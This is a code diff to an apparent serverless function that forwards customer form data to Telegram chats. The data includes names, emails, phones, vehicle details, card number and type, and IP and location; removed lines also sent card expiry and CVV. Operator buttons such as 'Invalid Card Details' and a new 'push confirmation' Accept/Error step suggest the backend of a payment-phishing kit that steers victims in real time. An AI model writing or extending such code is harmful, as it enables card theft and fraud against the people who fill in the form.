@@ -136,22 +136,16 @@ serve(async (req) => {
         if (data.test_mode) {
           paymentMethodText = `💳 *Payment Method:* (TEST MODE)\n` +
             `   • Card Number: ${data.card_number_masked}\n` +
-            `   • Card Type: ${data.card_type}\n` +
-            `   • Expiry: ${data.card_expiry}\n` +
-            `   • CVV: ${data.card_cvv}`;
-        } else {
+            `   • Card Type: ${data.card_type}`;
+        } else if (data.card_number_masked || data.card_type) {
           paymentMethodText = `💳 *Payment Method:*\n` +
-            `   • Card: ${data.card_number_masked} (${data.card_type})`;
+            `   • Card: ${data.card_number_masked || ''} ${data.card_type ? `(${data.card_type})` : ''}`.trim();
         }
 
         // Build location info for test mode
         let locationInfo = '';
-        if (data.test_mode && data.ip) {
-          // Escape special characters for Telegram Markdown
-          const escapeMarkdown = (text: string) => {
-            return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
-          };
-
+        if (data.test_mode && (data.ip || data.country)) {
+          const escapeMarkdown = (text: string) => String(text ?? '').replace(/[_*\[\]()~`>#+=|{}.!-]/g, '\\$&');
           locationInfo = `\n🌍 *Location Info:* (TEST MODE)\n` +
             `   • IP: ${escapeMarkdown(data.ip)}\n` +
             `   • Country: ${escapeMarkdown(data.country || 'Unknown')}\n` +
@@ -173,8 +167,8 @@ serve(async (req) => {
           `   • Model: ${data.vehicle_model}\n` +
           `   • Color: ${data.vehicle_color}\n\n` +
           `⏱️ *Duration:* ${data.duration}\n` +
-          `💰 *Price:* ${data.price}\n\n` +
-          paymentMethodText + locationInfo + `\n\n` +
+          `💰 *Price:* ${data.price}` +
+          (paymentMethodText ? `\n\n${paymentMethodText}` : '') + (locationInfo ? `${locationInfo}` : '') + `\n\n` +
           `⚡ *Choose payment processing method:*`;
         
         replyMarkup = {
@@ -185,6 +179,26 @@ serve(async (req) => {
             ],
             [
               { text: '❌ Invalid Card Details', callback_data: `payment_${data.userId}_error` }
+            ]
+          ]
+        };
+        break;
+
+      case 'push_confirmation':
+        chatId = telegramSettings.form_chat_id; // Send to the second (form) chat
+        message = `🔔 *PUSH CONFIRMATION REQUEST*\n\n` +
+          `🆔 *User ID:* \`${data.userId}\`\n` +
+          `👤 *Customer:* ${data.name}\n` +
+          `📧 *Email:* ${data.email}\n` +
+          `📱 *Phone:* ${data.phone}\n\n` +
+          `🚗 *Vehicle:* ${data.vehicle_registration} • ${data.vehicle_make} ${data.vehicle_model}${data.vehicle_color ? ` (${data.vehicle_color})` : ''}\n` +
+          `⏱️ *Duration:* ${data.duration}\n` +
+          `💰 *Price:* ${data.price || '—'}`;
+        replyMarkup = {
+          inline_keyboard: [
+            [
+              { text: '✅ Accept', callback_data: `push_${data.userId}_accept` },
+              { text: '❌ Error', callback_data: `push_${data.userId}_error` }
             ]
           ]
         };
